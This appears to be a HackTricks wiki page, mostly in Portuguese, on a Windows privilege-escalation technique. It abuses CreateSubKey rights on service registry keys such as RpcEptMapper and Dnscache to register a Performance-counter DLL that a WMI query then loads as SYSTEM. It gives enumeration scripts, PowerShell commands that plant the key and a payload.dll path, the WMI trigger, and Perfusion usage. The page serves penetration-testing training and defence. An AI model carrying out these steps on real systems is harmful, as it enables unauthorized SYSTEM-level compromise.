# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**A postagem original é** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

## Resumo

Se você só tiver **`Create Subkey`** / **`AppendData/AddSubdirectory`** em uma chave de registro de service, isso ainda é um bom indício de privesc. Normalmente você **não consegue** sobrescrever `ImagePath`, `ServiceDll` ou outros valores existentes diretamente, mas ainda pode ser possível criar uma chave filha **`Performance`** em:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Qualquer outra chave **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** em que seu token tenha **`KEY_CREATE_SUB_KEY`**

O truque é que o Windows ainda suporta o modelo legado de registro **PerfLib V1**. Se um service tiver uma subchave **`Performance`**, o Windows pode carregar uma DLL dali quando um consumidor de performance counter solicitar dados.

De acordo com a documentação da Microsoft, o registro mínimo é:
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Então, a conclusão ofensiva é: **não descarte uma descoberta de service registry só porque você obteve `CreateSubKey` em vez de `SetValue`**.

## Why this is enough for code execution

A subkey `Performance` normalmente **não** existe por padrão nesses services, então **`KEY_CREATE_SUB_KEY`** é o primitive de que você precisa. Assim que a key existir e contiver `Library`/`Open`/`Collect`/`Close`, qualquer **performance counter consumer** pode acionar o carregamento da DLL.

Alguns detalhes importantes:

- O valor **`Library`** pode apontar para um **caminho completo da DLL**.
- A DLL deve exportar **`OpenPerfData`**, **`CollectPerfData`** e **`ClosePerfData`** e retornar `ERROR_SUCCESS`.
- O code roda no **contexto do consumer**, **não necessariamente no processo do service vulnerável em si**.
- No caso clássico de `RpcEptMapper` / `Dnscache`, uma **WMI performance query** pode fazer o **`wmiprvse.exe`** carregar a DLL como **`NT AUTHORITY\SYSTEM`**.

É por isso que esse primitive é fácil de passar despercebido durante a triagem: a parent service key não é “totalmente gravável”, mas ainda assim pode ser weaponized.

## Quick enumeration

Verificação manual com **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Exemplo de PowerShell para procurar principais com poucos privilégios com **`CreateSubKey`** em chaves de serviço:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Ferramentas úteis:

- **PrivescCheck**: `Get-ModifiableRegistryPath` foi criado especificamente para identificar essa classe de problema.
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: automatiza o drop de DLL, o registro de `Performance`, o trigger via WMI, a duplicação de token e a limpeza em alvos legados vulneráveis (por exemplo: `Perfusion.exe -c cmd -i -k Dnscache`).

## Fluxo de abuso

Crie a subchave `Performance` e preencha os valores necessários:
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Então, acione um consumidor de desempenho **privilegiado**. Um exemplo clássico é uma consulta WMI sobre classes `Win32_Perf*`:
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Notas operacionais:

- Iniciar **`perfmon.exe`** é útil para verificar se o registro do contador está correto, mas isso normalmente só carrega a DLL no **seu próprio contexto de usuário**.
- Para um LPE real, acione um consumidor **privileged** como **WMI**.
- Se você estiver escrevendo seu próprio exploit, iniciar `cmd.exe` diretamente de dentro da DLL geralmente deixa você com um shell na **session 0**. `Perfusion` resolve isso duplicando o token privileged em um processo que foi criado suspenso na session do atacante.
- Combine a arquitetura da DLL com o consumidor alvo (**x64 em sistemas x64**).

## Notas de versão / desenvolvimentos recentes

Historicamente, as weak keys embutidas eram:

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` e `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` observa que as atualizações de **abril de 2021** removeram o caminho fácil de exploração no **Windows 8 / Windows Server 2012** atualizado, enquanto o **Windows 7 / Windows Server 2008 R2** permaneceu explorável através de **`Dnscache`**.

Este primitive **não é apenas histórico**. Em **janeiro de 2025**, a Microsoft corrigiu um issue relacionado de AD DS em que membros de **`Network Configuration Operators`** podiam criar subkeys em **`Dnscache`** e **`NetBT`**, e a mesma ideia de **Performance-counter DLL registration** podia ser reutilizada para chegar a **SYSTEM** em sistemas suportados.

Então a lição moderna é genérica: sempre que um principal com baixo privilégio tiver **`CreateSubKey`** em **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, verifique se uma child key **`Performance`** é suficiente antes de descartar a finding.

## Referências

- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
{{#include ../../banners/hacktricks-training.md}}
